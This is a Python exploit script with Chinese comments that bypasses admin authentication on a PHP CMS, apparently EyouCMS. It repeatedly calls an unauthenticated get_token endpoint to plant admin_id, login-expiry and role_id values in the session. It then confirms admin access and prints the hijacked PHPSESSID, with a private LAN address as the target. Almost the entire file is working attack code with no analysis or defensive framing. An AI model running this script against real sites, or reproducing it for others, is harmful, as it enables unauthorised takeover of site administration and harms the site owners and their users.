# -*- coding:utf-8 -*-
from time import time
 
import requests
import re
 
# 定义 header 头, 绕过 isAjax
header = {'x-requested-with': 'xmlhttprequest'}
 
# 定义一个 requests 会话
request = requests.session()
 
PHPSESSION = ""
 
 
# 绕过第一个判断
def get_session(url):
    global PHPSESSION
 
    # 设置 admin_id 并且，获取 PHPSESSION
    payload = '/index.php'
    result = request.get(url=url + payload, headers=header)
    # 获取PHPSESSION
    print("[+] PHPSESSION = " + re.search("PHPSESSID=(.*?);", result.headers["set-cookie"]).groups()[0])
    PHPSESSION = re.search("PHPSESSID=(.*?);", result.headers["set-cookie"]).groups()[0]
 
 
def set_admin_id(url):
    # 设置一个 admin_id 以绕过，第一个条件
    payload = '/index.php?m=api&c=ajax&a=get_token&name=admin_id'
    result = request.get(url=url + payload, headers=header).text
    print(f"[+] 正在设置 admin_id -> [{result}]")
 
 
def set_admin_login_expire(url):
    payload = "/index.php?m=api&c=ajax&a=get_token&name=admin_login_expire"
 
    while True:
        result = request.get(url=url + payload, headers=header).text
 
        # 第二个判断条件，判断登录是否在一小时里
        if (time() - int(change(result), 10) < 3600):
            print("[+] admin_login_expire = " + result)
            break
 
        print(f"[INFO] 正在爆破 admin_login_expire -> [{result}]")
 
 
def set_admin_info_role_id(url):
    payload = "/index.php?m=api&c=ajax&a=get_token&name=admin_info.role_id"
 
    while True:
        result = request.get(url=url + payload, headers=header).text
 
        # 第三个判断条件，判断是否是管理员权限
        if (int(change(result), 10) <= 0):
            print("[+] admin_login_expire = " + result)
            break
 
        print(f"[INFO] 正在爆破 admin_info.role_id -> [{result}]")
 
 
def check_login(url):
    payload = "login.php?m=admin&c=System&a=web&lang=cn"
    result = request.get(url=url + payload).text
 
    if "网站LOGO" in result:
        print(f"[+] 使用 PHPSESSION -> [{PHPSESSION}] 登录成功！")
    else:
        print(f"[+] 使用 PHPSESSION -> [{PHPSESSION}] 登录失败！")
 
# 如果第一个字符为字母就直接返回0，不是则直到找到字母，并且返回前面不是字母的字符
def change(string):
    temp = ''
    for n, s in enumerate(string):
        if n == 0:
            if s.isalpha():
                return '0'
                break
        if s.isdigit():
            temp += str(s)
        else:
            if s.isalpha():
                break
    return temp
 
 
def run(url):
    # 开始计时
    time_start = time()
 
    get_session(url)
    set_admin_id(url)
    set_admin_login_expire(url)
    set_admin_info_role_id(url)
    check_login(url)
 
    print(f"[+] PHPSESSION = {PHPSESSION}")
 
    # 结束计时
    time_end = time()
 
    print(f"[+] 总共用时 {int(time_end) - int(time_start)} s")
 
 
if __name__ == '__main__':
    url = "http://192.168.0.208"
    run(url)